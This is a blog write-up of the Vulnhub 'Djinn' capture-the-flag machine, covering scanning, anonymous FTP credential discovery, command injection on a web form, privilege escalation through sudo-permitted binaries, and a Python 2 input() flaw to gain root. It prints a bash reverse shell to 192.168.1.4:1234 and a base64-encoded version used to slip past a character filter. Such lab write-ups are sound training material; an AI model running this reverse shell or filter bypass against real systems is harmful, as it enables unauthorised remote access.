---
title:     "Vulnhub - Djinn"
tags: [medium,ftp,lfi,python,sudo]
layout: post
---

Today, We are going to pwn Djinn by [Mzfr](https://twitter.com/0xmzfr) from Vulnhub.

## Description:

```
    - Level: Beginner-Intermediate
    - flags: user.txt and root.txt
    - Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You'll see the IP right on the login screen. You have to find and 		read two flags (user and root) which is present in user.txt and root.txt respectively.
    - Format: Virtual Machine (Virtualbox - OVA)
    - Operating System: Linux
```
Download Link : <https://www.vulnhub.com/entry/djinn-1,397/>

Lets Begin with our Initial Scan

## Nmap Scan Results:
```
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20 23:54 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21 00:23 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21 00:23 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '*', 2)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '*', 5)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-title: Lost in space
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=3/24%Time=5E799BC2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\
SF:x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20
SF:__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\
SF:x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\
SF:x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths
SF:\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20
SF:you\x20your\x20gift\.\n\(3,\x20'\*',\x202\)\n>\x20")%r(RPCCheck,1BC,"\x
SF:20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\
SF:x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\
SF:x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\
SF:x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x
SF:20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x2
SF:0\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\
SF:___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\x
SF:20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x
SF:20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20you
SF:r\x20gift\.\n\(8,\x20'\*',\x205\)\n>\x20");
MAC Address: 08:00:27:C1:03:F8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Unix
```
## FTP:

I tried login FTP using ``anonymous`` and found 3 txt files.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/1.png) 

``creds.txt``
```
nitu:81299
```
``message.txt``
```
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```
``game.txt``
```
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
```

## HTTP:

It looks like an normal webpage, So let's try bruteforcing the directories!

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/2.png)

## Gobuster Results:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.5:7331/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html
[+] Timeout:        10s
===============================================================
2020/03/24 11:11:30 Starting gobuster
===============================================================
/wish (Status: 200)
/genie (Status: 200)
===============================================================
2020/03/24 11:47:13 Finished
===============================================================
```

``/wish``
It asks me to make a wish!

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/3.png)

When I make a wish in ``/wish`` I did ``ls`` so now we are redirected to ``/genie``. The page returns the result we wanted. Look like we can perform command injection on the input field.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/4.png)

So I tried executing a reverse shell

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/5.png)

But It displays ``Wrong Choice of Words`` 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/6.png)

After some experiment, I came to know it filters some special characters. We can bypass special characters by using base64 method.


```echo "bash -i >& /dev/tcp/192.168.1.4/1234 0>&1"|base64```

So I ``echo`` the base64 encoded content and pipe that to ``base64 -d``(which decodes) again and another pipe to execute it as ``bash``.

```echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNC8xMjM0IDA+JjEK|base64 -d|bash```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/7.png)


## Low Privilege Escalation to Nitish:

I checked ``/home`` and found 2 users ``nitish`` and ``sam``. I don't have permission on sam, but I can view ``nitish`` directory and found a hidden file ``.dev`` 
It gives me ``creds.txt``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/8.png)

`creds.txt`

``nitish:p4ssw0rdStr3r0n9``

Now I can switch user to ``nitish``

```
www-data@djinn:/home/nitish$ su nitish
Password: 
nitish@djinn:~$ whoami
nitish
nitish@djinn:~$ 
```

## Low Privilege Escalation to Sam:

Once I got user ``nitish`` I did ``sudo -l`` and found a binary ``genie`` which can be executed as user ``sam`` without the password.
```
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```
I tried some stuff with the binary and I can't do anything with that.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/9.png)

After sometime I checked if there is any ``man`` available for ``genie``. -h flag actually just for quick usage of the command.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/10.png)

```
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id
my man!!
$ whoami
sam
```

## Privilege Escalation to Root:

```
$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago

```
Another binary ``lago`` which can be executed as ``root`` without the password

It Looks like some sort of game.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/12.png)

Later I checked ``sam`` directory and found ``.pyc`` file. I downloaded to my machine using python server.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/11.png)
>pyc contain the compiled bytecode of Python source files.

There is a tool which helps to decomplie the python script for us.
>https://github.com/Mysterie/uncompyle2

```
# 2020.03.24 13:56:25 IST
# Embedded file name: /home/mzfr/scripts/exp.py
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'


if __name__ == '__main__':
    main(options())
# okay decompyling complied.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2020.03.24 13:56:25 IST
```

So this is the script from ``/root/lago`` and it looks like when we give ``num`` as input in ``Guess It`` it gives us shell.

```
def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'
```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/13.png)

Im Root

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/djinn1/14.png)

